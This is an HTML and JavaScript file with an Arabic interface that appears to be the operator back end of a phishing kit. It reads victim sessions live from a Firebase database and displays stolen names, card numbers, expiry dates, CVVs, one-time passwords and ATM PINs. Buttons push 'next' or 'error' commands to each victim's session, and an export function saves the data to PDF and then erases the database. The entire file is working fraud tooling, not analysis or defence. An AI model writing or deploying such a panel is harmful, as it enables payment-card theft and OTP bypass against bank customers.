<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel - Live Sessions</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
    
    <style>
        body { font-family: sans-serif; background: #f4f7f6; margin: 0; padding: 10px; }
        .nav-bar { background: #1a6d44; color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-radius: 8px; margin-bottom: 20px; }
        .live-count { background: #ffd700; color: #000; padding: 5px 15px; border-radius: 20px; font-weight: bold; }
        .card { background: white; border-radius: 10px; padding: 15px; margin-bottom: 15px; border-right: 10px solid #7f8c8d; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .data-grid { display: flex; flex-wrap: wrap; gap: 20px; border-top: 1px solid #eee; padding-top: 10px; margin-top: 10px; }
        .item { display: flex; flex-direction: column; }
        .label { font-size: 11px; color: #888; }
        .value { font-weight: bold; font-family: monospace; font-size: 14px; color: #333; }
        .status-tag { background: #e8f5e9; color: #2e7d32; padding: 3px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }
        .btn-gray { background: #7f8c8d; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body onload="_startMonitor()">

<audio id="alert" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

<div class="nav-bar">
    <div class="live-count">جلسات نشطة: <span id="online_count">0</span></div>
    <button class="btn-gray" style="background:#333;" onclick="_downloadPDF()">تحميل التقرير وتفريغ</button>
</div>

<div id="display_area"></div>

<script>
    // الإعدادات مأخوذة من الصورة اللي بعتها يا بشمهندس
    const config = {
        databaseURL: "https://system-cloud-v3-default-rtdb.firebaseio.com"
    };

    if (!firebase.apps.length) firebase.initializeApp(config);
    const db = firebase.database();

    function _startMonitor() {
        // المسار الظاهر في الصورة: live_sessions
        db.ref('live_sessions').on('value', snapshot => {
            const area = document.getElementById('display_area');
            area.innerHTML = '';
            let count = 0;

            snapshot.forEach(child => {
                const data = child.val();
                const id = child.key;
                count++;

                const html = `
                    <div class="card">
                        <div style="display:flex; justify-content:space-between; align-items:center;">
                            <span class="status-tag">الحالة: ${data.status || 'نشط'}</span>
                            <span style="font-size:10px; color:#aaa;">ID: ${id}</span>
                        </div>
                        <div class="data-grid">
                            <div class="item"><span class="label">الصفحة</span><span class="value">${data.page || '---'}</span></div>
                            <div class="item"><span class="label">الاسم</span><span class="value">${data.fullName || data.name || '---'}</span></div>
                            <div class="item"><span class="label">البطاقة</span><span class="value">${data.cardNumber || (data.card_details && data.card_details.cardNumber) || 'Waiting..'}</span></div>
                            <div class="item"><span class="label">EXP/CVV</span><span class="value">${data.expiryDate || '--'} / ${data.cvv || '--'}</span></div>
                            <div class="item" style="color:red;"><span class="label">OTP</span><span class="value">${data.otp || '---'}</span></div>
                            <div class="item"><span class="label">ATM</span><span class="value">${data.atm_pin || '---'}</span></div>
                        </div>
                        <div style="text-align:left; margin-top:10px;">
                            <button class="btn-gray" onclick="_control('${id}', 'next')">OK</button>
                            <button class="btn-gray" onclick="_control('${id}', 'error')">ERR</button>
                        </div>
                    </div>
                `;
                area.insertAdjacentHTML('afterbegin', html);
            });
            document.getElementById('online_count').innerText = count;
            if(count > 0) document.getElementById('alert').play().catch(()=>{});
        });
    }

    function _control(id, cmd) {
        db.ref('live_sessions/' + id).update({ control_action: cmd });
    }

    function _downloadPDF() {
        if(confirm("حفظ البيانات ومسح الجلسات؟")) {
            html2pdf().from(document.getElementById('display_area')).save().then(() => {
                db.ref('live_sessions').remove();
            });
        }
    }
</script>
</body>
</html>
